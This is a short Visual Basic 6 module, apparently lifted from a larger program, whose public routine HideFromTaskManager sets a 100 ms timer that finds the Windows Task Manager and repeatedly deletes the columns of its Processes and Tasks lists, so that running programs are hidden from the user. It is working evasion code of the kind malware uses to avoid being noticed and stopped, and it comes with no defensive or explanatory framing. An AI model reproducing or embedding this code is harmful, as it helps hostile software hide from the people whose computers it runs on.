Attribute VB_Name = "Module1"
Option Explicit

Private Const LVM_FIRST As Long = &H1000
Private Const LVM_DELETECOLUMN As Long = (LVM_FIRST + 28)

Private Declare Function FindWindow Lib "user32.dll" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Long
Private Declare Function EnumChildWindows Lib "user32.dll" (ByVal hWndParent As Long, ByVal lpEnumFunc As Long, ByVal lParam As Long) As Long
Private Declare Function GetWindowText Lib "user32" Alias "GetWindowTextA" (ByVal HWND As Long, ByVal lpString As String, ByVal cch As Long) As Long
Private Declare Function GetClassName Lib "user32.dll" Alias "GetClassNameA" (ByVal HWND As Long, ByVal lpClassName As String, ByVal nMaxCount As Long) As Long
Private Declare Function SendMessage Lib "user32.dll" Alias "SendMessageA" (ByVal HWND As Long, ByVal wMsg As Long, ByVal wParam As Long, lParam As Any) As Long
Private Declare Function SetTimer Lib "user32" (ByVal HWND As Long, ByVal nIDEvent As Long, ByVal uElapse As Long, ByVal lpTimerFunc As Long) As Long
Private Declare Function KillTimer Lib "user32" (ByVal HWND As Long, ByVal nIDEvent As Long) As Long

Private TimerID As Long
  
Private Function EnumChildProcedure(ByVal HWND As Long, ByVal lParam As Long) As Long
  Dim zName As String, zClassName As String, a As Long, b As Long
  zName = Space$(256)
  zClassName = Space$(256)
  GetWindowText HWND, zName, 256
  GetClassName HWND, zClassName, 256
  a = InStr(1, zName, Chr$(0), vbBinaryCompare) - 1
  b = InStr(1, zClassName, Chr$(0), vbBinaryCompare) - 1
  If a < 0 Then a = 0
  If b < 0 Then b = 0
  zName = Left$(zName, a)
  zClassName = Left$(zClassName, b)
'  Debug.Print zClassName, zName
  If LCase$(zClassName) = LCase$("SysListView32") Then
    If (LCase$(zName) = LCase$("Processes")) Or (LCase$(zName) = LCase$("Tasks")) Then
      SendMessage HWND, LVM_DELETECOLUMN, ByVal 0&, ByVal 0&
      SendMessage HWND, LVM_DELETECOLUMN, ByVal 0&, ByVal 0&
      SendMessage HWND, LVM_DELETECOLUMN, ByVal 0&, ByVal 0&
      SendMessage HWND, LVM_DELETECOLUMN, ByVal 0&, ByVal 0&
      SendMessage HWND, LVM_DELETECOLUMN, ByVal 0&, ByVal 0&
    End If
  End If
  EnumChildProcedure = 1
End Function

Private Sub HideFromTM()
  Dim HWND As Long
  HWND = FindWindow(vbNullString, "Windows Task Manager")
  If HWND <> 0 Then EnumChildWindows HWND, AddressOf EnumChildProcedure, ByVal 0&
End Sub

Public Sub HideFromTaskManager()
  TimerID = SetTimer(0, 0, 100, AddressOf HideFromTM)
End Sub

Public Sub StopHide()
  KillTimer 0, TimerID
End Sub
